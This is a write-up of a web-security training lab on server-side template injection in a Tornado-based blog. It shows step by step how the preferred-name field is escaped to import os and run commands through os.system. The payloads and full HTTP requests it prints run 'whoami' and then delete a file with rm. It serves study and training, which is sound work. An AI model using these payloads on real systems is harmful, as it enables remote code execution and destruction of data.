## Basic server-side template injection (code context)

This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter

Hint :

Take a closer look at the "preferred name" functionality.

## Notes

- Possibility to leave a comment on a post
- Preferred name feature
- /login


## Notes

- Tornado template engine
- Blog comment feature
- Preferred author display setting
- `/my-account/change-blog-post-author-display`
- Python code execution through Tornado templates

## Resume

1. Identify controllable template input
2. Confirm SSTI through mathematical evaluation
3. Identify Tornado template syntax
4. Escape the existing expression context
5. Execute arbitrary Python code
6. Import the `os` module
7. Execute operating system commands
8. Delete Carlos's file

## Solve

The application allows users to customize how their name is displayed above blog comments.

The account page contains the following form:

```html
<div id=account-content>
    <p>Your username is: wiener</p>

    <form class=login-form
          id=blog-post-author-display-form
          action="/my-account/change-blog-post-author-display"
          method="POST">

        <label>Preferred name</label>

        <select id=blog-post-author-display
                name=blog-post-author-display
                form=blog-post-author-display-form>

            <option value=user.name>Name</option>
            <option value=user.first_name>First Name</option>
            <option value=user.nickname selected>Nickname</option>

        </select>

        <input required
               type="hidden"
               name="csrf"
               value="ii8FyNjzf0UncAutaqFoXL3qWb4rs6ZO">

        <br/>

        <button class=button type=submit>Submit</button>
    </form>
</div>
```

When the form is submitted, the following request is sent:

```http
POST /my-account/change-blog-post-author-display HTTP/2

blog-post-author-display=user.nickname
```

The selected value is later rendered inside blog comments.

To identify SSTI, inject a mathematical expression using Tornado template syntax.

Tornado expressions use:

```tornado
{{ expression }}
```

Initial payload:

```text
user.name}}{{7*7}}
```

Injected request:

```http
POST /my-account/change-blog-post-author-display HTTP/2

blog-post-author-display=user.name}}{{7*7}}&csrf=ii8FyNjzf0UncAutaqFoXL3qWb4rs6ZO
```

After reloading the blog comment page, the rendered username becomes:

```text
Peter Wiener49}}
```

This confirms that:

```tornado
{{7*7}}
```

was evaluated server-side.

The application uses the Tornado template engine.

The vulnerability exists because attacker-controlled input is inserted directly into a server-side template expression.

Testing invalid template input:

```http
POST /my-account/change-blog-post-author-display HTTP/2

blog-post-author-display=name&name={{7*7}}&csrf=ii8FyNjzf0UncAutaqFoXL3qWb4rs6ZO
```

produces:

```text
Internal Server Error

Traceback (most recent call last):
File "<string>", line 16, in <module>
File "/usr/local/lib/python2.7/dist-packages/tornado/template.py", line 348, in generate
return execute()
File "<string>.generated.py", line 4, in _tt_execute
NameError: global name 'name' is not defined
```

The stack trace confirms:

```text
tornado/template.py
```

and proves the backend is executing Tornado templates.

Tornado allows execution of arbitrary Python statements using:

```tornado
{% code %}
```

To execute operating system commands, import the Python `os` module:

```python
import os
```

Then use:

```python
os.system()
```

Initial command execution payload:

```text
user.name}}{%25import+os%25}{{os.system('whoami')}}
```

Injected request:

```http
POST /my-account/change-blog-post-author-display HTTP/2

blog-post-author-display=user.name}}{%25import+os%25}{{os.system('whoami')}}&csrf=ii8FyNjzf0UncAutaqFoXL3qWb4rs6ZO
```

After reloading the comment page, the output becomes:

```text
Comments:

carlos Peter Wiener0}} | 22 May 2026

aa
```

The value:

```text
0
```

is the return code from:

```python
os.system('whoami')
```

This confirms arbitrary command execution.

The lab requires deleting:

```text
/home/carlos/morale.txt
```

Final payload:

```text
user.name}}{%25import+os%25}{{os.system('rm+/home/carlos/morale.txt')}}
```

Final exploit request:

```http
POST /my-account/change-blog-post-author-display HTTP/2
Host: 0a060046032d3c7fa1c51da2007500aa.web-security-academy.net

blog-post-author-display=user.name}}{%25import+os%25}{{os.system('rm+/home/carlos/morale.txt')}}&csrf=ii8FyNjzf0UncAutaqFoXL3qWb4rs6ZO
```

The Tornado template engine evaluates:

```python
import os
```

then executes:

```python
os.system('rm /home/carlos/morale.txt')
```

which runs the operating system command:

```bash
rm /home/carlos/morale.txt
```

As a result, Carlos's file is deleted and the lab is solved.

Proof of concept payload:

```text
user.name}}{{7*7}}
```

Result:

```text
Peter Wiener49}}
```

Command execution payload:

```text
user.name}}{%25import+os%25}{{os.system('whoami')}}
```

Final payload:

```text
user.name}}{%25import+os%25}{{os.system('rm+/home/carlos/morale.txt')}}
```